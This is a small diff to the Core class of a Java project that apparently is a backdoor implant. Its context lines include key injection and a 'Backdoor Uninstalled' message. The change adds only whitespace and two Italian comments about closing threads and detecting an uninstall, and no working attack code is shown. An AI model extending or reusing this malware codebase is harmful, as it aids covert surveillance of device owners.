@@ -40,6 +40,7 @@ public class Core {
             InstanceKeys323.injectKeys323();
         }
 
+      
         Core core = new Core();
         boolean ret = core.run();
 
@@ -77,7 +78,8 @@ public class Core {
             debug.info("starting checking actions");
             if (taskObj.checkActions() == false) {
                 debug.error("CheckActions() [Uninstalling?] FAILED");
-
+                // chiudere tutti i thread
+                // decidere se e' un uninstall
                 Msg.demo("Backdoor Uninstalled, reboot the device");
                 return false;
             }
